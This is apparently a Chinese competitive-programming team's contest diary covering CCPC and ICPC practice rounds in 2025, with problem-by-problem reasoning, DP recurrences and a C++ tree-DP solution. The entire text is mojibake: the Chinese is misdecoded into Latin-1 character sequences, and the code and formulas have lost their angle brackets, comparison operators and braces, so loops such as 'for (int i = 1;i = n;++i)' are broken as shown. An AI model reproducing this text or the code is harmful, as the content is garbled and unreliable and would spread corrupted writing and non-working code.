¹æ®å¥‡å¶æ€§ï¼Œæå‡ºäº†ç‚¹å¥‡æ•°åˆ è¾¹ï¼Œå¶æ•°è¾¹åˆ ç‚¹çš„çŒœæƒ³ã€‚ä½†æ˜¯åœ¨ç”±æ ‘å˜ä¸ºæ£®æ—çš„æ—¶å€™ï¼Œä¸¤æ¡é“¾ï¼ˆ3 + 2ï¼‰æ„æˆçš„æƒ…å†µçš„ç­”æ¡ˆæ•°é‡äº§ç”Ÿäº†ç–‘é—®ï¼Œä¼¼ä¹åœ¨ä¸€å®šç¨‹åº¦ä¸Šéœ€è¦æŠŠçŒœæƒ³åè¿‡æ¥ã€‚ ç»§ç»­æ‰‹åŠ¨æ¨¡æ‹Ÿ SG å‡½æ•°ï¼Œçªç„¶å‘ç°å¶æ•°è¾¹å¶æ•°ç‚¹çš„æƒ…å†µä¸‹ç­”æ¡ˆéƒ½æ˜¯ $0$ï¼Œåˆè¯•äº†å‡ ä¸ªç¡®å®šäº†è¿™ä¸ªçŒœæƒ³ã€‚äºæ˜¯é¢˜ç›®å˜æˆåˆ†ç±»è®¨è®ºåº¦æ•°å³å¯ã€‚ æˆ‘ä»¬å¡ G ä¹Ÿæœ‰ç‚¹æ—¶é—´ï¼Œç„¶åæˆ‘çªç„¶ç‚¹å‡ºå¢™ä½“åªæœ‰ç«–ç€çš„ï¼Œäºæ˜¯ç®€åŒ–äº†é—®é¢˜ã€‚ä¸»è¦æ˜¯è¿ç»­ä¸¤è¡Œä¹‹é—´çš„åˆå¹¶ï¼Œåˆ©ç”¨åŒæŒ‡é’ˆå°±èƒ½å®ç°ï¼Œç„¶åæœ€ååªéœ€è¦æ ¹æ®è¾¹æ•°å’Œç‚¹æ•°åˆ¤æ–­æ˜¯å¦ä¸ºä¸€æ£µæ ‘å³å¯ã€‚æ³¨æ„ï¼Œ$n \\ge 2 $ æ—¶ $m 2 \\times 10^5$ æ˜¾ç„¶ä¸º Noï¼Œä½†æ˜¯ $n = 1$ æ—¶éœ€è¦ç‰¹åˆ¤ã€‚äºæ˜¯æˆ‘ä»¬åœ¨è¿™é‡ŒæŒ‚äº†ä¸€å‘ã€‚ æ€»ä½“æ¥è¯´è¿™åœºæ‰“å¾—ä¸é”™ï¼Œå¯¹ç…§ç€ XCPC board ä¼¼ä¹å·®ä¸‰åå°±èƒ½ Auï¼Œæ€ªæˆ‘ L å†™å¾—æ…¢è¿˜å†™çº¢æ¸©äº†â€¦â€¦ 2025.08.31 CCPC 2023 Qinhuangdao SiteA æ˜¯ç®€å•æ„é€ ï¼ŒèŠ±è´¹ 2 s æƒ³åˆ°è§£æ³•ï¼Œå…¨éƒ¨å¯ä»¥æ„é€ æˆäº’è´¨çš„æƒ…å†µï¼Œä½†æ˜¯ç¬¬ä¸€å‘ WAã€‚å…ˆè®© Sky æ¥å†™ Gï¼Œç­”æ¡ˆå°±æ˜¯ $\\sum \\limits_{i = 2} ^ n |a_i - a_{i - 1}| + |b_i - b_{i - 1}|$ã€‚ ç„¶åå‘ç° A é¢˜ç›®ä¿è¯ $k \\ge 2n$ ä½†æ˜¯æˆ‘åªç”¨äº† $2n - 1$ ä¸ªï¼Œå‘ç°æ²¡æœ‰ä¿è¯ç¬¬ä¸€ä¸ªæ•°å’Œæœ€åä¸€ä¸ªæ•°çš„è¡Œåˆ—éƒ½è‡³å°‘æœ‰ä¸¤ä¸ªæ•°å­—ï¼Œä¿®è¡¥ä¸€ä¸‹å°±è¿‡äº†ã€‚ Zlw çœ‹äº† Jï¼Œæ˜¯ä¸€é“ç®€å•å­é›†æšä¸¾çš„çŠ¶å‹ï¼Œæ—¶é—´å¤æ‚åº¦ä¸º $O(3^n + n2^n)$ã€‚ æ¥ä¸‹æ¥ä¸¤å°æ—¶å†…æ— äººè¿‡é¢˜â€¦â€¦ D è¢« Zlw æƒ³åˆ°äº†ä¸€ä¸ª DPï¼Œç„¶åç”¨åŒæŒ‡é’ˆå’Œå¹³è¡¡æ ‘åœ¨ç»´æŠ¤ï¼Œæ„Ÿè§‰å¾ˆæ˜¯å¤æ‚ã€‚æäº¤äº†å¥½å‡ ééƒ½æ²¡è¿‡ï¼Œå¯¹æ‹è¿˜æ²¡æ‹å‡ºæ¥ã€‚ç„¶å Sky è¿˜å¼€äº† Fï¼Œè¦æ±‚ç›¸é‚»ä¸¤æ•°å¾—æ˜¯è´¨æ•°ï¼Œç„¶åæ³¨æ„åˆ° $1 + 1 = 2$ è¿™ä¸ªè´¨æ•°æ¯”è¾ƒç‰¹æ®Šï¼Œæ¥ä¸‹å»æ²¡ä»€ä¹ˆè¿›å±•ã€‚ ç„¶åæˆ‘çªç„¶çµå…‰ä¸€ç°ï¼Œæƒ³åˆ°äº† D å¯èƒ½æ˜¯ä¸ªè´ªå¿ƒã€‚ç”±äºä¼˜æƒ åˆ¸å¯ä»¥å åŠ ä½¿ç”¨ï¼Œå¯ä»¥å…ˆå°†ä¼˜æƒ åˆ¸æŒ‰ç…§è¿‡æœŸæ—¶é—´æ’åºï¼Œç„¶åå¯¹äºå½“å‰ä¼˜æƒ åˆ¸ï¼Œé€‰æ‹© $[1,r_i]$ èŒƒå›´å†… $a_i$ æœ€å°çš„é‚£ä¸ªï¼Œç„¶å $a_i \\leftarrow a_i - w_i$ï¼Œæœ€åç›´æ¥å¯¹ $a_i$ æ’åºå³å¯ã€‚äºæ˜¯ä¸Šæœºå†™ï¼Œè®© Zlw å»çœ‹ Sky çš„é¢˜ã€‚ æˆ‘åœ¨å†™çš„æ—¶å€™ï¼ŒZlw æå‡ºä¸€ä¸ª DP çš„å†™æ³•ï¼Œ$dp_{i,0/1/2/3}$ è¡¨ç¤ºå¡«ç¬¬ $i$ ä¸ªæ•°æ—¶ï¼Œ$i$ æ”¹ä¸ºå¶æ•°ï¼Œä¸ä¸º $1$ çš„å¥‡æ•°ï¼Œä¸º $1$ï¼Œä¸å˜è¿™å››ç§æƒ…å†µï¼Œç„¶åå°±èƒ½å¤Ÿè½¬ç§»ã€‚ D å¯¹äºæ›´æ–° $a_i$ æ²¡å•¥å¥½çš„æƒ³æ³•ï¼Œç›´æ¥ä¸Šçº¿æ®µæ ‘è¿›è¡Œæ›´æ–°ï¼Œå†™å®Œä»¥åä¸€éè¿‡æ ·ä¾‹ï¼Œç›´æ¥äº¤ï¼Œç»ˆäº ACï¼ Zlw çš„ F ä¹Ÿè¿‡æ ·ä¾‹äº†ï¼Œä½†æ˜¯ WAã€‚å«æˆ‘è¿‡å»ç…ç…ï¼Œä¸€è¡Œè¡Œç»™æˆ‘ç¿»è¯‘ï¼Œç„¶åæˆ‘çªç„¶å‘ç°æœ‰ä¸€ç§æƒ…å†µè½¬ç§»çš„æ—¶å€™æ¼æ‰äº†å›ºå®šä¸º $1$ çš„æƒ…å†µï¼Œä¿®æ”¹ä»¥åç›´æ¥é€šè¿‡ã€‚ æ¥ä¸‹å»çœ‹äº† Mï¼Œä½†æ˜¯æ²¡å•¥æƒ³æ³•ï¼Œäºæ˜¯ä¸‹ç­ã€‚äº‹å®è¯æ˜ï¼Œå…¨é˜Ÿçš„æ ‘å½¢ dp ä¸å¤ªè¡Œï¼ˆç‰›å®¢çš„æ—¶å€™é‡åˆ°æ ‘å½¢ dp çš„ä¸­æ¡£é¢˜ä¹Ÿæ²¡è§£å‡ºæ¥ï¼‰ã€‚æœ€å $5$ é¢˜ï¼Œä½†æ˜¯æˆ‘ä»¬çš„ DF éƒ½æ˜¯ä¸‰å°æ—¶çš„æ—¶å€™æ‰è¿‡ï¼Œäºæ˜¯åœ¨ XCPC board ä¸Šåªèƒ½æ’åˆ° Cuï¼ 2025.09.05 The 15th Shandong CCPC Provincial Collegiate Programming Contestä¸´æ—¶åŠ è®­äº†ä¸€åœºç®€å•çš„ SUA çœèµ›åœºï¼Œç”¨æ¥å¢å¼ºä¿¡å¿ƒï¼Zlw ä½¬è¿˜åœ¨èµ›æ—¶ç§’äº† Eï¼Œä¸€å¼€å§‹ TLEï¼Œç¨å¾®ä¼˜åŒ–äº†ä¸€ä¸‹å°±è¿‡äº†ï¼Œç»“æœè¿˜æ˜¯ä¸€è¡€æ¥ç€ï¼ ç½‘ç»œé¢„é€‰èµ›2025.09.07 The 2025 ICPC Asia East Continent Online Contest (I)èµ›æ—¶ 6 é¢˜ï¼Œæœ€åä¸¤å°æ—¶æœ‰ç‚¹å€’é—­ï¼Œæ²¡æœ‰è¿‡é¢˜ï¼Œåœ¨åŒæ ¡ä¸­æ’ rk3ï¼ˆç”±äºå‰æœŸå…‰é€Ÿè¿‡é¢˜ï¼Œæˆ‘ä»¬æ˜¯å…­é¢˜é˜Ÿåœ¨æ’åœ¨å‰é¢çš„ã€‚ä½†æ˜¯éå¸¸å¯æ¶ï¼Œè¢«ç‰¢å‘¨é˜Ÿåœ¨å°æ¦œä»¥ååè¶…äº†ï¼‰ã€‚ G ç­¾åˆ°ï¼Œå…¶å®æ˜¯ Sky åšå‡ºæ¥çš„ï¼Œä¸€å¼€å§‹ Zlw ä»¥ä¸ºè¿é€šå°±å¯ä»¥ï¼Œä½†æ˜¯çªç„¶å‘ç°å°çš„æ•°ä¼šå¡åœ¨å‰é¢é˜»æ­¢åˆ«äººäº¤æ¢ã€‚Skyçªç„¶è¯´å¿…é¡»è¦è¿ $1\\rightarrow 2\\rightarrow\\cdots\\rightarrow n$ï¼ŒZlw è§‰å¾—æœ‰é“ç†ï¼Œä½†æ˜¯ç”±äºæ•°ç»„å¼€å°äº†æ®µé”™è¯¯äº†ä¸€å‘ã€‚ æ¥ç€ A å¤§æ¨¡æ‹Ÿï¼Œè¶ç€é˜Ÿå‹ä¸Šæœºä»”ç»†æƒ³äº†ç»†èŠ‚ï¼Œåæ¥ä¸Šæœºä¸€å‘è¿‡ï¼Œè¿™æ˜¯å¥½çš„ï¼ åˆšä¸‹æœºé˜Ÿå‹å°±å‘ç° B æ˜¯ä¸ªå¤§è¯ˆéª—ï¼Œå‘ç° $\\gcd$ çš„å¯èƒ½ç»“æœæ˜¯ $n$ çš„çº¦æ•°ï¼Œç†è®ºä¸Šå¯ä»¥æšä¸¾ï¼Œç„¶åè®¡ç®—æ¯ä¸ª $\\gcd$ çš„æ–¹æ¡ˆæ•°ã€‚ä¸€å¼€å§‹çœ‹é”™é¢˜äº†ä»¥ä¸º $a$ æ˜¯ç»™å®šçš„ï¼Œåé¢å‘ç° $a_i=i$ï¼Œçªç„¶æƒ³åˆ°å¯¹äºæ¯ä¸€ä¸ªçº¦æ•°çš„åŒä½™ç»“æœæ˜¯ç›¸åŒçš„ï¼Œåœ¨æƒ³å®¹æ–¥çš„è¿‡ç¨‹ä¸­çªç„¶å‘ç°åªè¦è¿ç»­çš„åˆ é™¤æ•°å¯¹äºç»“æœçš„å½±å“ç†åº”æ˜¯ç›¸åŒçš„ã€‚æ‰€ä»¥ç›´æ¥åˆ  $[1,K]$ ç†è®ºå¯è¡Œã€‚éªŒè¯äº†ä¸€ä¸‹ç¡®å®ä¸æ ·ä¾‹ç»“æœç›¸åŒï¼Œæäº¤äº†ä¸€ä¸‹è¿‡äº†ã€‚ç›´æ¥è¾“å‡º $1 \\sim k$ å°±è¿‡äº†ï¼ æ¥ä¸‹å»é˜Ÿå‹å‘ç°ä¸å¤ªä¼š Dï¼Œäºæ˜¯ Zlw å¼€å§‹å°è¯•çœ‹ã€‚ä»–ä¿©å¼€å§‹è®¨è®º Mï¼Œå¾ˆæ˜æ˜¾çš„åˆ†å±‚å›¾æœ€çŸ­è·¯ï¼Œåªä¸è¿‡ $O(nm(\\log n+\\log m))$ çš„å¤æ‚åº¦å¾ˆåŠé€€ã€‚è¿›ä¸€æ­¥å‘ç°å¯ä»¥ä¸€å±‚å±‚è½¬ç§»ï¼Œæ¯ä¸€å±‚åªéœ€è¦è€ƒè™‘æ ‘ä¸Šçš„æ¾å¼›æ“ä½œï¼Œå¾ˆå®¹æ˜“è·‘ä¸æ»¡ï¼ŒåŠ ä¸Šå•å±‚è½¬ç§»çš„æ—¶å€™å¯ä»¥åšåˆ° $O(nm\\log n)$ ï¼Œæ¯”ä¸Šé¢çš„å¤æ‚åº¦ç¨æœ‰ä¼˜åŒ–ï¼Œä¸”å¸¸æ•°å°ä¸å°‘ï¼Œå†™äº†ä¸€ä¸‹ $0.9s$ è·‘è¿‡ã€‚å†™å®Œä»¥å pta åœ¨é˜Ÿé•¿æœºä¸Šå´©äº†ä¸€ä¼šå„¿ï¼Œè‡ªå¸¦ç½šæ—¶ï¼Œæ£é¼“ä¸¤åˆ†é’Ÿä»¥åæ‰äº¤äº†ä¸Šå»ï¼Œå¥½åœ¨ä¸€å‘é€šè¿‡ã€‚ D æˆ‘è§‰å¾—å¯èƒ½æ˜¯è´ªå¿ƒï¼Œè€ƒè™‘é“¾çš„æƒ…å†µï¼Œå¦‚æœå‡ºç°å³°å€¼ï¼Œå°±æŠŠå·®å€¼ç»å¯¹å€¼å°çš„ä¸€è¾¹åˆ æ‰ã€‚å¯æ˜¯æƒ³äº†ä¸€ä¼šå„¿å‘ç° 5 3 9 1 çš„æƒ…å†µä¼šæŠŠ $3$ çš„ä¸¤æ¡é“¾å…¨éƒ½åˆ æ‰ï¼Œçœ‹æ¥è´ªå¿ƒä¸å¤ªå¯¹ã€‚ ç„¶åé˜Ÿå‹çœ‹äº† Iï¼Œçªç„¶å†’å‡ºæ¥ä¸€å †äººé€šè¿‡ï¼Œäºæ˜¯çœ‹äº†ä¸€çœ¼ã€‚é€šè¿‡å¥‡å¦™è¯æ˜å‘ç°ï¼Œå˜å‘ä¸ä¼šä½¿å¾—ç­”æ¡ˆå˜å¤§ï¼Œäºæ˜¯åè¿‡æ¥è¯´å˜å‘ä¹Ÿä¸ä¼šä½¿å¾—ç­”æ¡ˆå˜å°ï¼Œäºæ˜¯æ­£åå‘ç­”æ¡ˆä¸å˜ã€‚ç»“åˆå¤§é‡çš„é€šè¿‡äººæ•°è¿›ä¸€æ­¥éªŒè¯ï¼Œäºæ˜¯ä» $T$ å‡ºå‘è·‘æœ€çŸ­è·¯å³å¯ã€‚ D ä¾æ—§å€’é—­ï¼Œä¸‰ä¸ªäººéƒ½æƒ³è¿‡äº†è¿˜æ˜¯ä¸å¤ªè¡Œã€‚äºæ˜¯çœ‹çœ‹ Cï¼Œæ„Ÿè§‰å¾ˆè´ªï¼Œä¸€å¼€å§‹æƒ³è¦ä»å°åŒºé—´æ‰©å±•åˆ°å¤§åŒºé—´ï¼Œä½†æ˜¯å‘ç° $[1,2],[4,5],[2,4]$ è¿™ç»„æ•°æ®å¯ä»¥ hack æ‰ã€‚Zlw å¼€å§‹å‘åŠ›ï¼ä¸€å¼€å§‹åˆè¯»é”™é¢˜ä»¥ä¸º $a$ æ˜¯ç»™å®šçš„ï¼Œç›´åˆ°çœ‹åˆ° $1\\leq n\\leq 10^9$ æ‰å‘ç°åˆæ˜¯ $a_i=i$ã€‚äºæ˜¯å˜å¾—éå¸¸å¯åšï¼Œå¤§éƒ¨åˆ†èµ‹å€¼éƒ½ä¼šä½¿å¾—ç­”æ¡ˆ $-1$ã€‚ä»å·¦åˆ°å³è€ƒè™‘åŒºé—´ï¼Œè¿›ä¸€æ­¥å‘ç°åœ¨åŸæœ¬é€‰å®šçš„èµ‹å€¼æ–¹æ¡ˆåï¼Œå¯ä»¥é€šè¿‡åœ¨å®é™…ä¸Šå€’ç€æ“ä½œæ¥æ„é€ åˆæ³•æ–¹æ¡ˆã€‚ç„¶åé€šè¿‡å„ç§æ‰‹ç©å‘ç°æŒ‰ç…§ $(r,l)$ å‡åºæ’åºä¼šæ¯”è¾ƒå¥½å¤„ç†ã€‚é—®é¢˜è½¬åŒ–ä¸ºä¸€ä¸ªè´ªå¿ƒï¼Œç”¨ set åˆ†åŒºé—´ç»´æŠ¤æœªåˆ é™¤çš„ç‚¹ï¼Œæ‰¾åˆ° $\\geq l$ çš„ç¬¬ä¸€ä¸ªæœªåˆ ç‚¹åˆ†é…ç»™åŒºé—´å³å¯ã€‚æˆ‘æƒ³äº†æƒ³ï¼Œæ„Ÿè§‰å¾ˆå¯¹ï¼Œäºæ˜¯ä»–åˆä¸Šæœºå†™ï¼Œä¸€å‘é€šè¿‡ï¼ï¼ï¼ï¼ ä»–ä¿©çœ‹äº†çœ‹å…¶å®ƒé¢˜ï¼ŒD ä¾æ—§æ”¾ç€ã€‚å‘ç° F æ˜¯ä¸ªå¥½ç©çš„äº¤äº’ï¼Œæå‡ºäº†å¯ä»¥ä¸€ä¸ªéš”ä¸€ä¸ªçš„é˜²å¾¡ï¼Œäºæ˜¯ Sky å¼€å§‹æ‰§ç¬”è¿·é¢˜ã€‚ è‡³äº Dï¼Œå¼€å±€åªæœ‰é˜Ÿé•¿æœºèƒ½ç™»å½•ï¼Œä¸€é¢˜é¢˜é€Ÿè§ˆï¼ŒZlw çœ‹åˆ° D é¢˜é¢˜é¢è¾ƒçŸ­ï¼Œå¾ˆå¿«è¯»å®Œå‘ç°æ˜¯ä¸ªæ ‘æ ‘é¢˜ï¼Œäºæ˜¯ Zlw å°±å…ˆåˆ°æ—è¾¹æƒ³äº†ï¼Œåœ¨å¯ä»¥è·Ÿæ¦œå‰æ²¡æœ‰ä»»ä½•æ€è·¯ï¼Œç­‰åˆ°å‘ç° G æœ‰äººè¿‡äº†å°±å…ˆæ‰”äº† Dã€‚ç»“æœä¸€ç›´åˆ°æœ€åå¡é¢˜çš„æ—¶å€™æ‰ç”± Scy æå‡ºäº†ä¸€ä¸ªç¥å¦™è´ªå¿ƒï¼Œå¯¹äºä¸€ä¸ªèŠ‚ç‚¹ï¼Œä¸ä¸‹é¢çš„èŠ‚ç‚¹åˆå¹¶åªæœ‰ä¸‰ç§æ–¹å¼ï¼Œä»å¤´åˆå¹¶ï¼Œä»å°¾åˆå¹¶ä»¥åŠä¸­é—´åˆå¹¶ã€‚è”æƒ³åˆ°å¯ä»¥åˆ†å¼€ç®—è´¡çŒ®ï¼Œåªè€ƒè™‘æ¯ä¸€å¯¹çˆ¶äº²å„¿å­çš„è´¡çŒ®å³å¯ã€‚ä½†æ˜¯æœ€å dp çš„æ—¶å€™å‘ç°ä¸€ä¸ªåç¼€å’Œå¤„ç†é”™è¯¯ï¼Œä»¥åŠåœ¨è€ƒè™‘ä¸¤æ¡é“¾åˆå¹¶çš„æ—¶å€™æ²¡æœ‰åŠ å…¥å…¶å®ƒå„¿å­çš„è´¡çŒ®ï¼Œèµ›æ—¶ç›´åˆ°æœ€åéƒ½æ²¡æœ‰åšå‡ºæ¥ã€‚ ä½†æ˜¯å†™å®Œç”±äºä¸€äº›ç¥ç§˜çš„ bugï¼Œå¯¼è‡´åˆ°æœ€åéƒ½æ²¡è¿‡ã€‚æœ€ååŠå°æ—¶ Sky è¿˜æ¥å°è¯•äº† Fï¼Œä½†æ˜¯ç”±äºç»†èŠ‚å¤ªå¤šï¼Œè¿™é¢˜ä¹Ÿæ²¡è¿‡ã€‚æœ€åæ€»æ’ 309ï¼Œé—æ†¾ç¦»åœºäº†ï¼ ã€Scy ã®è¡¥é¢˜ã€‘ è®©æˆ‘ä»¬æ¥å®Œæ•´çš„é‡æ–°å¤ç°ä¸€ä¸‹ D çš„æ€è·¯ä»¥åŠæœ€åçš„æ­»äº¡å›æ”¾ï¼š æ”¹å®Œä»¥åå°± AC äº†ï¼Œè­¦é’Ÿé•¿é¸£ã€‚ ä»¤ $dp_{u,0/1/2}$ è¡¨ç¤º $u$ ç‚¹æ”¾åˆ°ä¸­é—´ï¼Œæ”¾åˆ°å³ä¾§ï¼Œæ”¾åˆ°å·¦ä¾§æ—¶ $u$ å­æ ‘å†…çš„ç­”æ¡ˆã€‚è®©æˆ‘ä»¬å…ˆæ¥åˆ†æä¸€ä¸‹å‡ ç§æƒ…å†µã€‚ $dp_{u,1}$ çš„æ›´æ–°ç›¸å½“äºä¸€ä¸ªåŸæ¥ä¸ºå‘å³çš„ç®­å¤´ï¼Œ$a_v$ åœ¨æœ€å³ä¾§ã€‚å½“ $a_u a_v$ æ—¶ï¼Œå¯¹ $dp_{u,1}$ çš„é¢å¤–çš„è´¡çŒ®ä¸º $a_u - a_v$ï¼Œå¦åˆ™ä¸ºè´Ÿè´¡çŒ®ã€‚ $dp_{u,2}$ çš„æ›´æ–°åŒç†ï¼Œå…¶ä¸­æ­£çš„é¢å¤–è´¡çŒ®ä¸º $a_v - a_u$ã€‚è‹¥å‡ºç°è´Ÿè´¡çŒ®ï¼Œå®é™…ä¸Šä¼šåœ¨å¦ä¸€ç§æƒ…å†µä¸­å˜ä¸ºæ­£çš„è´¡çŒ®ã€‚ $dp_{u,0}$ ç¨å¾®å¤æ‚ä¸€ç‚¹ï¼Œåˆ†ä¸ºå››ç§æƒ…å†µï¼š $\\rightarrow u \\leftarrow$ ä¸”ä¸¤ä¸ªç®­å¤´ä¸é‡å ï¼Œè¿™ä¸€æ®µçš„è´¡çŒ®æ›´æ–°ä¸º $dp_{k1,1} + dp_{k2,2} + w_{k2} - w_{k1}$ã€‚ $\\rightarrow u \\leftarrow$ ä¸”ä¸¤ä¸ªç®­å¤´é‡å ï¼Œè¿™ä¸€æ®µçš„è´¡çŒ®æ›´æ–°ä¸º $dp_{k1,1} + dp_{k2,2} -(w_{k1} - w_{k2})$ï¼Œå‡å»çš„å°±æ˜¯é‡å çš„é‚£ä¸€éƒ¨åˆ†ï¼Œæ”¹ä¸ºåŠ å·å…¶å®å’Œç¬¬ä¸€ç§æƒ…å†µè¡¨è¾¾å¼ä¸€è‡´ã€‚ $\\leftarrow u \\rightarrow$ ä¸”ä¸¤ä¸ªç®­å¤´æ˜¯å¦é‡å å‡å¯ï¼Œæ­¤æ—¶ $dp_{u,0}$ æ— æ³•å¤„ç†è´¡çŒ®ï¼Œä½†æ˜¯è¯¥æƒ…å†µä¼šè¢«å½’ç±»ä¸º $dp_{u,1/2}$ã€‚ ç»¼ä¸Šæ‰€è¿°åˆ™æœ‰ \\begin{cases} dp_{u,1} = \\max \\limits_{k \\in son_u}\\left\\{\\sum \\limits_{v \\in son_u \\mid v eq k} \\max \\{dp_{v,0},dp_{v,1},dp_{v,2}\\} + dp_{k,1} + w_u - w_v\\right\\}\\\\ dp_{u,2} = \\max \\limits_{k \\in son_u}\\left\\{\\sum \\limits_{v \\in son_u \\mid v eq k} \\max \\{dp_{v,0},dp_{v,1},dp_{v,2}\\} + dp_{k,2} + w_v - w_u\\right\\}\\\\ dp_{u,0} = \\max \\limits_{k1,k2 \\in son_u\\wedge k1 eq k2}\\left\\{\\sum \\limits_{v \\in son_u \\mid v eq k1 \\wedge v eq k2} \\max \\{dp_{v,0},dp_{v,1},dp_{v,2}\\} + dp_{k1,1} + dp_{k2,2} + w_{k2} - w_{k1}\\right\\}\\\\ \\end{cases}å¯¹äº $dp_{u,0}$ çš„æ›´æ–°ï¼Œç›´æ¥åšæ˜¯ $O(n^2)$ çš„ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥é¢„å¤„ç† $dp_{k2} + w_{k2}$ å‰åç¼€æœ€å¤§å€¼ï¼Œè¿™æ ·å°±å¯ä»¥åœ¨ $O(n)$ çš„æ—¶é—´å†…æ›´æ–°å®Œã€‚äºæ˜¯è¿™é“é¢˜åšå®Œäº†ï¼Œæœ€åæ—¶é—´å¤æ‚åº¦ä¸º $O(n)$ï¼Œä»£ç å¦‚ä¸‹ï¼š int main () int n = read (); vector int a (n + 1); vector vector int ve (n + 1); vector vectorll dp (n+1,vectorll(3,0)); for (int i = 1;i = n;++i) a[i] = read (); for (int i = 1;i n;++i) int u = read (),v = read (); ve[u].push_back (v);ve[v].push_back (u); auto dfs = [] (auto self,int u,int fa) - void vector ll pre (ve[u].size (),0),suf (ve[u].size (),0); ll mx1 = -1e18,mx2 = -1e18;int c = 0; for (auto v : ve[u]) if (v == fa) continue; self (self,v,u); ll gv = max (dp[v][0],dp[v][1],dp[v][2]); mx1 = max (mx1,dp[v][1] + (a[u] - a[v]) - gv); mx2 = max (mx2,dp[v][2] + (a[v] - a[u]) - gv); pre[c] = suf[c] = dp[v][2] + a[v] - gv; dp[u][1] += gv,dp[u][2] += gv,dp[u][0] += gv; ++c; dp[u][1] = max (dp[u][1],dp[u][1] + mx1); dp[u][2] = max (dp[u][2],dp[u][2] + mx2); --c; for (int i = 1;i = c;++i) pre[i] = max (pre[i],pre[i - 1]); for (int i = c - 1;i = 0;--i) suf[i] = max (suf[i],suf[i + 1]); int cc = 0;ll res = 0; for (auto v : ve[u]) if (v == fa) continue; ll mx = -1e18,gv = max (dp[v][0],dp[v][1],dp[v][2]); if (cc) mx = max (mx,pre[cc - 1]); if (cc != c) mx = max (mx,suf[cc + 1]); res= max (res,dp[u][0] + dp[v][1] - a[v] + mx - gv); ++cc; dp[u][0] = res; ; dfs (dfs,1,0); printf(%lld ,max(dp[1][0],dp[1][1],dp[1][2])); return 0; ã€Sky ã®è¡¥é¢˜ã€‘ é¢˜ç›®å¤§æ„å¾ˆç®€å•ï¼Œå°±æ˜¯ä¸€ä¸ªæ£‹ç›˜ï¼Œæˆ‘å…ˆæ‰‹ï¼Œä¸€æ¬¡å¯ä»¥éšä¾¿ä¸‹ä¸€ä¸ªä½ç½®ï¼Œç„¶åæœºå™¨äººæœ‰ä¸€ä¸ªåˆå§‹ä½ç½®ï¼Œä¸€æ¬¡å¯ä»¥å¾€å…«ä¸ªæ–¹å‘éšä¾¿èµ°ä¸€æ ¼ï¼Œç›®æ ‡å°±æ˜¯å µä½æœºå™¨äººã€‚ æ³¨æ„åˆ°é¢˜ç›®ç»™äº†æœ€å¤§æ­¥æ•°é™åˆ¶ $T=1000$ï¼Œä»¥åŠæœºå™¨äººæœ€å¤§åˆå§‹ä½ç½® $(20, 20)$ï¼Œè€ƒè™‘å»ºä¸€å µæ¨ªç€ $30$ï¼Œç«–ç€ $30$ çš„å¢™ï¼ŒæŠŠæœºå™¨äººå›´åœ¨å¢™å†…ï¼Œç„¶ååœ¨é‡Œé¢éšä¾¿å¡«ï¼Œæœ€å¤šä¹Ÿå°± $30 \\times 30=900$ æ­¥ï¼ˆç°åœ¨æƒ³äº†ä¸‹å¥½åƒéƒ½ä¸ç”¨ $30$ é‚£ä¹ˆè¿œï¼Œä½†èµ›æ—¶ä¸ºäº†æ–¹ä¾¿å°±ç›´æ¥é€‰äº† $30$ï¼‰ã€‚ æˆ‘ä»¬å…ˆæ‰‹ï¼Œæ˜¯ä¸ªå¾ˆæœ‰ç”¨çš„æ¡ä»¶ï¼Œå¦‚ä½•åˆ©ç”¨å¥½è¿™ä¸ªæ¡ä»¶æ˜¯è§£ä½“çš„å…³é”®ã€‚å½“ç„¶ï¼Œå¼€å±€è¦å…ˆå µ $(30,30)$ï¼Œè¿™ä¸ªå…¶å®æ¯”è¾ƒç¥ç§˜ï¼Œå› ä¸ºå¼€å±€ä¸çŸ¥é“æœºå™¨äººæ€ä¹ˆèµ°çš„è¯ï¼Œå µå…¶ä»–åœ°æ–¹éƒ½ä¼šæµªè´¹ã€‚ åœ¨è‰ç¨¿çº¸ä¸Šç©äº†åŠä¸ªå°æ—¶åï¼Œå‘ç°å¦‚æœæœºå™¨äººç¦»è¾¹ç•Œæ¯”è¾ƒè¿œçš„è¯ï¼Œå…¶èµ°çš„å…«ä¸ªæ–¹å‘å¯ä»¥åˆ†ä¸ºå››ç±»ï¼š å·¦ã€å·¦ä¸‹ã€ä¸‹ã€‚è¿™ä¸€ç±»ä¸ä¼šå¨èƒæˆ‘å»ºå¢™ï¼Œéšä¾¿å»ºå³å¯ã€‚ å·¦ä¸Šã€ä¸Šã€‚è¿™ä¸€ç±»ä¼šå¨èƒæˆ‘å»ºä¸Šé¢çš„å¢™ï¼Œæˆ‘éœ€è¦åœ¨æœºå™¨äººå½“å‰åæ ‡çš„æ­£ä¸Šæ–¹ï¼ˆé¡¶åˆ° $30$ï¼‰çš„å·¦è¾¹ä¸¤æ ¼å»ºå¢™ã€‚ å³ä¸‹ã€å³ã€‚è¿™ä¸€ç±»ä¼šå¨èƒæˆ‘å»ºå³è¾¹çš„å¢™ï¼ŒåŒç†ï¼Œæˆ‘éœ€è¦åœ¨æœºå™¨äººå½“å‰åæ ‡çš„æ­£å³æ–¹ï¼ˆé¡¶åˆ° $30$ï¼‰çš„ä¸‹é¢ä¸¤æ ¼å»ºå¢™ã€‚ å³ä¸Šã€‚è¿™æ˜¯å¨èƒæœ€å¤§çš„ï¼ŒåŒæ—¶å½±å“æˆ‘å»ºä¸Šé¢å’Œå³è¾¹çš„å¢™ï¼Œæ‰€ä»¥æˆ‘è®°å½•ä¸€ä¸ªå¸ƒå°”å˜é‡ $tf$ï¼Œç”¨äºè½®æµå»ºä¸Šé¢å’Œå³è¾¹çš„å¢™ã€‚ å½“ç„¶ï¼Œå¦‚æœè¿™ç§æ–¹å¼éœ€è¦å»ºçš„å¢™è¢«å µä½äº†ï¼Œåœ¨å®ƒæ—è¾¹èƒ½å»ºçš„ä½ç½®å»ºä¸€ä¸ªå°±å¥½äº†ï¼Œåæ­£è¦å°½å¿«å»ºå¢™ã€‚ ä½†æ˜¯ï¼Œå¦‚æœæœºå™¨äººèµ°åˆ°ç¦»è¾¹ç•Œæ¯”è¾ƒè¿‘çš„åœ°æ–¹ï¼Œå…·ä½“å°±æ˜¯å·® $2$ æ ¼çš„ä½ç½®ï¼Œæˆ‘ä»¬å°±è¦è€ƒè™‘ç»“åˆä¸Šé¢çš„ç­–ç•¥ï¼Œä¸è¦è®©æœºå™¨äººèµ°å‡ºå»ã€‚ 